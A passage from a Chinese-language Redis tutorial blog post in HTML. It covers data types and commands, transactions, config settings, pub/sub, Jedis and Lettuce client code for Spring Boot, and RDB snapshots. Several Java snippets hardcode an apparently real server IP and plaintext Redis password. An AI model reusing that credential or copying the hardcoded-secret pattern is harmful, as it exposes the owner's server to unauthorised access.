title=\"背景\"></a>背景</h3><p>Web1.0的时代，由于数据访问量有限，用高性能的单点服务器可以解决大部分问题。<br>Web2.0的时代的到来，使得用户访问量大幅度提升，同时产生了大量的用户数据。加上后来的智能移动设备的普及，所有的互联网平台都面临了巨大的性能挑战。暴露了很多难以克服的问题,例如:.<br>①对数据库高并发读写的需求<br>②对海量数据的高效率存储和访问的需求<br>③对数据库的高可扩展性和高可用性的需求</p>\n<p>NoSQL数据库的产生就是为了解决大规模数据集合多重数据种类带来的挑战,尤其是大数据应用难题<br>NoSQL(NoSQL = Not Only SQL )，意即“不仅仅是SQL”，泛指非关系型的数据库。<br>NoSQL 不依赖业务逻辑方式存储，而以简单的key-value模式存储。因此大大的增加了数据库的扩展能力。</p>\n<p>技术发展</p>\n<p>技术的分类<br>1、解决功能性的问题：Java、Jsp、RDBMS、Tomcat、HTML、Linux、JDBC、Git<br>2、解决扩展性的问题：Struts、Spring、SpringMVC、Hibernate、Mybatis<br>3、解决性能的问题：NoSQL、Java线程、Hadoop、Nginx、MQ、ElasticSearch</p>\n<h3 id=\"特性\"><a href=\"#特性\" class=\"headerlink\" title=\"特性\"></a>特性</h3><p> 不遵循SQL标准。<br> 不支持ACID。（并不是说NoSQL事务）<br> 远超于SQL的性能。</p>\n<p> 降低了CPU以及IO的压力</p>\n<h3 id=\"NoSQL适用场景\"><a href=\"#NoSQL适用场景\" class=\"headerlink\" title=\"NoSQL适用场景\"></a>NoSQL适用场景</h3><p>对数据高并发的读写，海量数据的读写，对数据高可扩展性的。<br>需要事务支持，表之间有较为复杂的关系的场景不建议使用。<br>一句话:对于用不着sql的和用了sq也不行的情况，请考虑用NoSql</p>\n<p>常见的NoSQL分类：</p>\n<p>1.键值存储如Memcache，redis</p>\n<p>2.文档存储如MongoDB</p>\n<p>3.行式存储，列式存储如HBase，Cassandra</p>\n<p>4.图关系存储</p>\n<p>常用的如下</p>\n<table>\n<thead>\n<tr>\n<th>Memcache</th>\n<th>很早出现的NoSql数据库 数据都在内存中，一般不持久化 支持简单的key-value模式，支持类型单一 一般是作为缓存数据库辅助持久化的数据库</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Redis</td>\n<td>几乎覆盖了Memcached的绝大部分功能 数据都在内存中，支持持久化，主要用作备份恢复 除了支持简单的key-value模式，还支持多种数据结构的存储，比如 list、set、hash、zset等。 一般是作为缓存数据库辅助持久化的数据库</td>\n</tr>\n<tr>\n<td>MongoDB</td>\n<td>高性能、开源、模式自由(schema free)的文档型数据库 数据都在内存中， 如果内存不足，把不常用的数据保存到硬盘 虽然是key-value模式，但是对value（尤其是json）提供了丰富的查询功能 支持二进制数据及大型对象 可以根据数据的特点替代RDBMS ，成为独立的数据库。或者配合RDBMS，存储特定的数据。</td>\n</tr>\n</tbody></table>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220607113648442.png\" alt=\"image-20220607113648442\"></p>\n<h3 id=\"Redis应用场景\"><a href=\"#Redis应用场景\" class=\"headerlink\" title=\"Redis应用场景\"></a>Redis应用场景</h3><p>1、redis用于控制数据库表主键id,为数据库表主键提供生成策略，保障数据库表的主键唯一性<br>2、redis控制数据的生命周期，通过数据是否失效控制业务行为，适用于所有具有时效性限定控制的操作<br>3、redis应用于各种结构型和非结构型高热度数据访问加速<br>4、redis应用于购物车数据存储设计<br>5、redis应用于抢购，限购类、限量发放优惠卷、激活码等业务的数据存储设计<br>6、redis应用于具有操作先后顺序的数据控制<br>7、redis应用于最新消息展示<br>8、redis应用于随机推荐类信息检索，例如热点歌单推荐，热点新闻推荐，热卖旅游线路，应用APP推荐，大V推荐等<br>9、redis应用于同类信息的关联搜索，二度关联搜索，深度关联搜索<br>10、redis应用于同类型不重复数据的合并、取交集操作<br>11、redis应用于同类型数据的快速去重<br>12、redis.应用于基于黑名单与白名单设定的服务控制<br>13、redis.应用于计数器组合排序功能对应的排名<br>14、redis.应用于定时任务执行顺序管理或任务过期管理<br>15、redis,应用于及时任务/消息队列执行管理<br>16、redis,应用于按次结算的服务控制<br>17、redis应用于基于时间顺序的数据操作，而不关注具体时间</p>\n<h2 id=\"常用数据类型\"><a href=\"#常用数据类型\" class=\"headerlink\" title=\"常用数据类型\"></a>常用数据类型</h2><p>主要有5种：string，list，set，hash，zset</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220607115932817.png\" alt=\"image-20220607115932817\"></p>\n<h3 id=\"string类型\"><a href=\"#string类型\" class=\"headerlink\" title=\"string类型\"></a>string类型</h3><p>存储的数据：单个数据，最简单的数据存储类型，也是最常用的数据存储类型</p>\n<p>存储数据的格式：一个存储空间保存一个数据，与java的String类似</p>\n<p>存储内容：通常使用字符串，如果字符串以整数的形式展示，可以作为数字操作使用(但是仍是字符串)</p>\n<p>String是最常用的一种数据类型，普通的key/value存储都可以归为此类。一个Key对应一个Value，string类型是二进制安全的。</p>\n<p>Redis的string可以包含任何数据，比如jpg图片(生成二进制)或者序列化的对象</p>\n<p>常用Api</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">set</span> key <span class=\"keyword\">value</span></span><br><span class=\"line\">mset key1 value1 key2 value2 ..... </span><br><span class=\"line\"><span class=\"keyword\">get</span> key</span><br><span class=\"line\">mget key1 key2 ...</span><br><span class=\"line\">del key </span><br><span class=\"line\">strlen key</span><br><span class=\"line\">append key <span class=\"keyword\">value</span> #有则追加，否则新建</span><br><span class=\"line\">setnx key <span class=\"keyword\">value</span>  #不存在才创建，否则失败</span><br><span class=\"line\">setex key <span class=\"type\">time</span> <span class=\"keyword\">value</span> #设置值得同时设置过期时间</span><br><span class=\"line\"><span class=\"keyword\">set</span> key <span class=\"keyword\">value</span> nx ex <span class=\"type\">time</span>  </span><br><span class=\"line\">incr key</span><br><span class=\"line\">incrby key increment\t#以步长增加</span><br><span class=\"line\">decr key</span><br><span class=\"line\">decrby key increment\t#以步长减少</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"list类型\"><a href=\"#list类型\" class=\"headerlink\" title=\"list类型\"></a>list类型</h3><p>据存储需求：存储多个数据，并对数据进入存储空间的顺序进行区分<br>需要的存储数据：一个存储空间保存多个数据，且通过数据可以体现进入顺序</p>\n<p>list类型：保存多个数据，底层使用双向链表+压缩链表</p>\n<p>常用Api</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">lpush key value1 value2...</span><br><span class=\"line\">rpush key value1 value2...</span><br><span class=\"line\">lpop key </span><br><span class=\"line\">lpop key</span><br><span class=\"line\">lrange key stratindex endindex</span><br><span class=\"line\">lindex key index\t#查询第几个元素</span><br><span class=\"line\">llen key\t#获取长度</span><br><span class=\"line\">blpop key timeout</span><br><span class=\"line\">brpop key timeout</span><br><span class=\"line\">#阻塞式获取，在规定时间内获取这个值，规定时间内如果还没有的时候可以等，直到有值就可以获取到获取超时获取为空。开两个客户端，一个设置<span class=\"number\">15</span>s内获取list1中的值，此时list1位空一直等待(阻塞)，在<span class=\"number\">15</span>秒内另一个客户端存入到list1中数据，此时就被获取到</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"hash类型\"><a href=\"#hash类型\" class=\"headerlink\" title=\"hash类型\"></a>hash类型</h3><p>String类型存储对象类数据的存储如果具有较为频繁的更新需求，操作会显得笨重，存容易，改麻烦。可以选择hash类型存储，每个hash类型的key对应一张表，为了区别与Redis中的键值对的称呼，hash中的键成为field，而key特征Redis的键。</p>\n<p>新的存储需求：对一系列存储的数据进行编组，方便管理，典型应用存储对象信息<br>需要的内存结构：一个存储空间保存多少个键值对数据<br>hash类型：底层使用哈希表与HashMap类似</p>\n<p>常用APi</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">hset key field1 value1 field2 value2 field3 value3</span><br><span class=\"line\">hget key field</span><br><span class=\"line\">hgetall key</span><br><span class=\"line\">hkeys key #获得所有field的集合</span><br><span class=\"line\">hvals key #获得所有<span class=\"keyword\">value</span>的集合</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"hash类型数据操作的注意事项\"><a href=\"#hash类型数据操作的注意事项\" class=\"headerlink\" title=\"hash类型数据操作的注意事项\"></a>hash类型数据操作的注意事项</h4><p>hash类型下的value只能存储字符串，不允许存储其他类型数据，不存在嵌套现象。如果数据未获取到，对应的值为(nil)</p>\n<p>每个hash可以存储232-1个键值对</p>\n<p>hash类型十分贴近对象的数据存储形式，并且可以灵活添加删除对象属性。但hash设计不是为了存储大量对象的，切记不可滥用，更不可以将hash作为对象列表使用</p>\n<p>hgetall操作可以获取全部属性，如果内部fiekd过多，遍历整体数据效率就会很低，有可能成为数据访问瓶颈。</p>\n<h3 id=\"set类型\"><a href=\"#set类型\" class=\"headerlink\" title=\"set类型\"></a>set类型</h3><ul>\n<li><p>新的存储需求：存储大量的数据，在查询方面提供更高的效率</p>\n</li>\n<li><p>需要的存储结构：能够保存大量的数据，搞笑的内部存储机制，便于查询</p>\n</li>\n<li><p>set类型：与hash存储结构完全相同，仅存储键，不存储值（nil)，并且值式不允许重复的。也就是只有键没有值的hash</p>\n</li>\n</ul>\n<p>常用Api</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">sadd key value1 value2 ...</span><br><span class=\"line\">smembers key</span><br><span class=\"line\">srem key value1 value2 ...</span><br><span class=\"line\">scard key</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"zset类型\"><a href=\"#zset类型\" class=\"headerlink\" title=\"zset类型\"></a>zset类型</h3><ul>\n<li>新的存储需求：根据排序有利于数据的有效显示，需要提供一种可以根据自身特征进行排序的方式。</li>\n<li>需要的存储结构：新的存储模型，可以保存可排序的数据。</li>\n<li>sorted_set类型：在set的存储结构基础上添加可排序字段。（添加一个分数，可以根据分数排名）</li>\n</ul>\n<p>常用Api</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">zadd key score1 value1 score2 value2 score3 value3 ....</span><br><span class=\"line\">zrange key <span class=\"keyword\">start</span> stop [withscore]</span><br><span class=\"line\">zrevrange key <span class=\"keyword\">start</span> stop [withscore]</span><br><span class=\"line\">zrem key <span class=\"keyword\">value</span></span><br><span class=\"line\">#查询scores在某个范围内的值</span><br><span class=\"line\">zrangebyscore key min max [WITHSCORES] [LIMIT]</span><br><span class=\"line\">#查询key某个索引范围内的值</span><br><span class=\"line\">zrevrangebyscore key max min [WITHSCORES]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"新数据类型\"><a href=\"#新数据类型\" class=\"headerlink\" title=\"新数据类型\"></a>新数据类型</h2><p><a href=\"https://blog.csdn.net/weixin_42923363/article/details/123199880\">https://blog.csdn.net/weixin_42923363/article/details/123199880</a></p>\n<h2 id=\"事务\"><a href=\"#事务\" class=\"headerlink\" title=\"事务\"></a>事务</h2><p>相关命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">discard #取消事务</span><br><span class=\"line\">exec  #执行事务块所有命令</span><br><span class=\"line\">multi #标记一个事务块的开始</span><br><span class=\"line\">watch key #监视一个或多个key，如果在事务执行之前，key被其他命令所修改则事务块都不会执行</span><br><span class=\"line\">unwatch 取消watch对所有key的监视</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>存在语法错误（编译失败）则全部不会执行</p>\n</li>\n<li><p>存在语义错误（有异常）则只有语义出错的语句不会执行</p>\n</li>\n</ul>\n<h2 id=\"配置文件\"><a href=\"#配置文件\" class=\"headerlink\" title=\"配置文件\"></a>配置文件</h2><blockquote>\n<pre><code> 1. 单位不区分大小写\n 2. include &quot;./redis.conf&quot;可以引入配置文件\n 3. bind 127.0.0.1 -::1表示只可本地访问 0.0.0.0表示谁都可以访问\n 4. proteceed-mode 表示允不允许远程访问与上类似\n 5. port修改监听端口\n 6. tcp-backlog 在高并发环境下需要一个高backlog值避免慢客户端连接的问题\n 7. daemonlize 表示是否后台启动\n 8. pidfile当前进程号\n 9. database设置使用的数据库\n 10. requirepass设置密码\n 11. maxclients最大连接数，默认1000，超出会拒绝\n 12. maxmemory 必须设置否则服务器内存占满，服务器会宕机，一旦达到内存使用上限，redis将会视图移除内部数据，移除规则可以通过maxmemory-policy来指定\n</code></pre>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220607132056492.png\" alt=\"image-20220607132056492\"></p>\n</blockquote>\n<p>可以在客户端中通过命令<code>config set key value</code>设置但是设置不会持久化重启就消失，如果需要持久化可以通过save实现</p>\n<h2 id=\"发布与订阅\"><a href=\"#发布与订阅\" class=\"headerlink\" title=\"发布与订阅\"></a>发布与订阅</h2><p>订阅<code>subscribe channel </code></p>\n<p>发布<code>publish channel message</code></p>\n<p> 注：发布的消息没有持久化，如果在订阅的客户端收不到hello，只能收到订阅后发布的消息。（只能在订阅的频道收到消息，没有订阅的频道收不到任何消息），可以订阅多个channel，</p>\n<p>应用场景</p>\n<p>1、构建实时消息系统，比如普通的即时聊天，群聊等功能。</p>\n<p>2、微信的公共号订阅消息推送等</p>\n<h2 id=\"整合Springboot\"><a href=\"#整合Springboot\" class=\"headerlink\" title=\"整合Springboot\"></a>整合Springboot</h2><p>redis的常用客户端有jedis与lettuce，在springboot2.2版本后默认是lettuce，如果不想用可以在redis依赖中排除lettuce</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">exclusions</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">exclusion</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>io.lettuce<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>lettuce-core<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">exclusion</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">exclusions</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"jedis\"><a href=\"#jedis\" class=\"headerlink\" title=\"jedis\"></a>jedis</h3><blockquote>\n<p>Jedis是同步的，不支持异步，Jedis客户端实例不是线程安全的，需要每个线程一个Jedis实例，所以一般通过连接池来使用Jedis.</p>\n<p>优点：</p>\n<p>提供了比较全面的 Redis 操作特性的 APIAPI 基本与 Redis 的指令一一对应，使用简单易理解</p>\n<p>缺点：</p>\n<p>同步阻塞 IO,不支持异步,线程不安全</p>\n</blockquote>\n<h4 id=\"jedis单机使用\"><a href=\"#jedis单机使用\" class=\"headerlink\" title=\"jedis单机使用\"></a>jedis单机使用</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Jedis jedis = <span class=\"keyword\">new</span> Jedis(<span class=\"string\">&quot;124.223.84.201&quot;</span>,<span class=\"number\">6379</span>);</span><br><span class=\"line\">jedis.auth(<span class=\"string\">&quot;xxxxxxx&quot;</span>);<span class=\"comment\">//如果有密码</span></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">* 操作</span></span><br><span class=\"line\"><span class=\"comment\">*</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\">jedis.close();</span><br><span class=\"line\">然后通过jedis操作redis</span><br></pre></td></tr></table></figure>\n\n<p>可以在配置文件中配置连接</p>\n<h4 id=\"jedis连接池\"><a href=\"#jedis连接池\" class=\"headerlink\" title=\"jedis连接池\"></a>jedis连接池</h4><p>jedis连接池一般都是单例</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JedisPoolFactory</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">volatile</span> JedisPool jedisPool = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">private</span> <span class=\"title\">JedisPoolFactory</span><span class=\"params\">()</span></span>&#123;&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> JedisPool <span class=\"title\">getJedisPool</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(jedisPool==<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">synchronized</span> (JedisPoolFactory.class)&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (jedisPool==<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">\t\t\t\t\tJedisPoolConfig config = <span class=\"keyword\">new</span> JedisPoolConfig();</span><br><span class=\"line\">\t\t\t\t\tconfig.setMaxTotal(<span class=\"number\">200</span>);</span><br><span class=\"line\">\t\t\t\t\tconfig.setMaxIdle(<span class=\"number\">32</span>);</span><br><span class=\"line\">\t\t\t\t\tconfig.setMaxWaitMillis(<span class=\"number\">100</span>*<span class=\"number\">1000</span>);</span><br><span class=\"line\">\t\t\t\t\tconfig.setBlockWhenExhausted(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">\t\t\t\t\tconfig.setTestOnBorrow(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">\t\t\t\t\tjedisPool = <span class=\"keyword\">new</span> JedisPool(config,<span class=\"string\">&quot;124.223.84.201&quot;</span>,<span class=\"number\">6379</span>,<span class=\"number\">6000</span>,<span class=\"string\">&quot;gxy261023&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> jedisPool;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//用法</span></span><br><span class=\"line\">JedisPool jedisPool = JedisPoolFactory.getJedisPool();</span><br><span class=\"line\">Jedis jedis = jedisPool.getResource();</span><br><span class=\"line\">jedis.lpush(<span class=\"string\">&quot;workder&quot;</span>,<span class=\"string\">&quot;xiaoli&quot;</span>,<span class=\"string\">&quot;xiaohone&quot;</span>,<span class=\"string\">&quot;lisi&quot;</span>);</span><br><span class=\"line\">jedis.rpush(<span class=\"string\">&quot;sttudd&quot;</span>,<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;aaaa&quot;</span>,<span class=\"string\">&quot;bbbb&quot;</span>,<span class=\"string\">&quot;ccccc&quot;</span>&#125;);</span><br><span class=\"line\">String gxy = jedis.get(<span class=\"string\">&quot;gxy&quot;</span>);</span><br><span class=\"line\">System.out.println(gxy);</span><br><span class=\"line\">jedis.close();</span><br><span class=\"line\">jedisPool.close();</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"lettuce\"><a href=\"#lettuce\" class=\"headerlink\" title=\"lettuce\"></a>lettuce</h3><blockquote>\n<p>Lettuce是基于Netty框架的事件驱动的Redis客户端，其方法调用是异步的，Lettuce的API也是线程安全的，所以多个线程可以操作单个Lettuce连接来完成各种操作，同时Lettuce也支持连接池.</p>\n<p>优点：</p>\n<p>线程安全<br>基于 Netty 框架的事件驱动的通信，可异步调用<br>适用于分布式缓存</p>\n<p>缺点：</p>\n<p>API 更抽象，学习使用成本高</p>\n</blockquote>\n<h4 id=\"lettuce单机使用\"><a href=\"#lettuce单机使用\" class=\"headerlink\" title=\"lettuce单机使用\"></a>lettuce单机使用</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//1.创建uri</span></span><br><span class=\"line\">RedisURI uri = RedisURI.Builder.redis(<span class=\"string\">&quot;124.223.84.201&quot;</span>,<span class=\"number\">6379</span>).withPassword(<span class=\"string\">&quot;gxy261023&quot;</span>).build();</span><br><span class=\"line\"><span class=\"comment\">//2.创建客户端</span></span><br><span class=\"line\">RedisClient redisClient = RedisClient.create(uri);</span><br><span class=\"line\"><span class=\"comment\">//3.通过客户端进行连接</span></span><br><span class=\"line\">StatefulRedisConnection&lt;String, String&gt; connect = redisClient.connect();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//4.1异步命令</span></span><br><span class=\"line\">RedisAsyncCommands&lt;String, String&gt; async = connect.async();</span><br><span class=\"line\">async.set(<span class=\"string\">&quot;springboot&quot;</span>,<span class=\"string\">&quot;hello redis&quot;</span>);</span><br><span class=\"line\">RedisFuture&lt;String&gt; gxy = async.get(<span class=\"string\">&quot;gxy&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">//get方法会阻塞直至有结果，除非设置超时</span></span><br><span class=\"line\">System.out.println(gxy.get());</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//4.2同步命令</span></span><br><span class=\"line\">RedisCommands&lt;String, String&gt; sync = connect.sync();</span><br><span class=\"line\">String a = sync.get(<span class=\"string\">&quot;a&quot;</span>);</span><br><span class=\"line\">System.out.println(a);</span><br><span class=\"line\"></span><br><span class=\"line\">redisClient.shutdown();</span><br></pre></td></tr></table></figure>\n\n<p>可以在配置文件中配置连接</p>\n<h4 id=\"lettuce连接池\"><a href=\"#lettuce连接池\" class=\"headerlink\" title=\"lettuce连接池\"></a>lettuce连接池</h4><p>　我们在服务器开发的过程中，往往会有一些对象，它的创建和初始化需要的时间比较长，比如数据库连接，网络IO，大数据对象等。在大量使用这些对象时，如果不采用一些技术优化，就会造成一些不可忽略的性能影响。一种办法就是使用对象池，每次创建的对象并不实际销毁，而是缓存在对象池中，下次使用的时候，不用再重新创建，直接从对象池的缓存中取即可。为了避免重新造轮子，我们可以使用优秀的开源对象池化组件apache-commons-pool2，它对对象池化操作进行了很好的封装，我们只需要根据自己的业务需求重写或实现部分接口即可，使用它可以快速的创建一个方便，简单，强大对象连接池管理类</p>\n<p>lettuce连接池需要commons-pool2依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.commons<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>commons-pool2<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//1.创建uri</span></span><br><span class=\"line\">RedisURI uri = RedisURI.Builder.redis(<span class=\"string\">&quot;124.223.84.201&quot;</span>,<span class=\"number\">6379</span>).withPassword(<span class=\"string\">&quot;gxy261023&quot;</span>).build();</span><br><span class=\"line\"><span class=\"comment\">//2.创建客户端</span></span><br><span class=\"line\">RedisClient client = RedisClient.create(uri);</span><br><span class=\"line\"><span class=\"comment\">//3.配置连接</span></span><br><span class=\"line\">GenericObjectPoolConfig config = <span class=\"keyword\">new</span> GenericObjectPoolConfig&lt;&gt;();</span><br><span class=\"line\">config.setMaxTotal(<span class=\"number\">200</span>);</span><br><span class=\"line\">config.setMaxIdle(<span class=\"number\">20</span>);</span><br><span class=\"line\">config.setMinIdle(<span class=\"number\">10</span>);</span><br><span class=\"line\"><span class=\"comment\">//4.通过工具类生成连接池</span></span><br><span class=\"line\">GenericObjectPool&lt;StatefulRedisConnection&lt;String, String&gt;&gt; pool = ConnectionPoolSupport.createGenericObjectPool(client::connect, config);</span><br><span class=\"line\">StatefulRedisConnection&lt;String, String&gt; connection = pool.borrowObject();</span><br><span class=\"line\">RedisAsyncCommands&lt;String, String&gt; asyncCommands = connection.async();</span><br><span class=\"line\">asyncCommands.multi();</span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">* 执行原子操作</span></span><br><span class=\"line\"><span class=\"comment\">* </span></span><br><span class=\"line\"><span class=\"comment\">* */</span></span><br><span class=\"line\">asyncCommands.exec();</span><br><span class=\"line\"><span class=\"comment\">//5.归还连接</span></span><br><span class=\"line\">pool.returnObject(connection);</span><br><span class=\"line\">pool.close();</span><br><span class=\"line\">client.shutdown();</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h4 id=\"集群使用\"><a href=\"#集群使用\" class=\"headerlink\" title=\"集群使用\"></a>集群使用</h4><blockquote>\n<p>只需要把RedisClient换成RedisClusterClient</p>\n<p>RedisClusterClient clusterClient = RedisClusterClient.create(uri);</p>\n</blockquote>\n<p>springboot包装好了客户端给我们使用（StringRedisTemplate与RedisTemplate），就效率而言jedis比RedisTemplate快,如果需要使用</p>\n<h2 id=\"持久化方式\"><a href=\"#持久化方式\" class=\"headerlink\" title=\"持久化方式\"></a>持久化方式</h2><p>​    下次重新开机后redis会将保存的数据恢复到内存中</p>\n<p>​    两种持久化方案既可以同时使用(of),又可以单独使用，在某种情况下也可以都不使用，具体使用那种持久化方案取决于用户的数据和应用决定。无论使用AOF还是快照机制持久化，将数据持久化到硬盘都是有必要的，除了持久化外，用户还应该对持久化的文件进行备份<br>最好备份在多个不同地方)。</p>\n<p>​    相同的数据量下,rdb 文件要小于 aof 文件,且恢复速度要快于 aof</p>\n<h3 id=\"Snapshot\"><a href=\"#Snapshot\" class=\"headerlink\" title=\"Snapshot\"></a>Snapshot</h3><h4 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h4><p>这种方式可以将某一时刻所有的数据都写入硬盘中，当然这也是redis的默认开启的持久化方式，保存的文件以.rdb形式结尾，因此这种方式也称为RDB方式</p>\n<h4 id=\"生成方式\"><a href=\"#生成方式\" class=\"headerlink\" title=\"生成方式\"></a>生成方式</h4><ul>\n<li>客户端方式：SAVE和BGSAVE</li>\n<li>服务端配置自动触发</li>\n</ul>\n<h5 id=\"BGSAVE\"><a href=\"#BGSAVE\" class=\"headerlink\" title=\"BGSAVE\"></a>BGSAVE</h5><p>客户端可以使用BGSAVE命令来创建一个快照，当接收到客户端的BGSAVE命令时，redis会调用fork来创建一个子进程，然后子进程负<br>责将快照写入磁盘中，而父进程则继续处理命令请求。<br>“名词解释：fork一个进程创建子进程的时候，底层的操作系统会创建该进程的一个副本，在linux系统中创建子进程的操作会进行优<br>化：在刚开始的时候，父子进程共享相同内存，直到父进程或子进程对内存进行了写之后，对被写入的内存的共享才会结束服务</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220607163714604.png\" alt=\"image-20220607163714604\"></p>\n<p>写时复制（COW）</p>\n<p>Redis借助了linux系统的写时复制（Copy-On-Write）技术，在生成快照的同时，仍然可以接收命令处理数据。简单来说，bgsave线程是由主线程fork生成的子线程，可以共享主线程所有的内存数据。bgsave线程运行后，开始读取主线程的内存数据，也就是redis的内存数据，将内存数据写入到dump.rdb文件中。此时，如果主线程处理的命令都是读操作，则bgsave线程不受影响。如果主线程处理了写操作，则会对该命令操作的数据复制一份，生成副本，bgsave线程会把这个副本写入到dump.rdb文件中，而在这个过程中，主线程仍可执行命令。</p>\n<h5 id=\"SAVE（不推荐）\"><a href=\"#SAVE（不推荐）\" class=\"headerlink\" title=\"SAVE（不推荐）\"></a>SAVE（不推荐）</h5><p>在快照生成完成之前不会再响应其他的命令</p>\n<p><img src=\"C:\\Users\\86188\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220607163727221.png\" alt=\"image-20220607163727221\"></p>\n<p>对比</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>save</th>\n<th>bgsave</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>IO类型</td>\n<td>同步</td>\n<td>异步</td>\n</tr>\n<tr>\n<td>是否阻塞其他命令</td>\n<td>是</td>\n<td>否（fork会短暂阻塞）</td>\n</tr>\n<tr>\n<td>复杂度</td>\n<td>O(n)</td>\n<td>O(n)</td>\n</tr>\n<tr>\n<td>优点</td>\n<td>不会消耗额外内存</td>\n<td>不阻塞操作</td>\n</tr>\n<tr>\n<td>缺点</td>\n<td>阻塞操作</td>\n<td>会消耗额外内存</td>\n</tr>\n</tbody></table>\n<h5 id=\"服务器配置\"><a href=\"#服务器配置\" class=\"headerlink\" title=\"服务器配置\"></a>服务器配置</h5><p>在配置文件中配置了<code>SAVE n m</code>(表示在n秒内至少m条记录发生变化    )后,达到任意一条SAVE的要求后会自动执行一次<code>bgsave</code></p>\n<h5 id=\"客户端shutdown\"><a href=\"#客户端shutdown\" class=\"headerlink\" 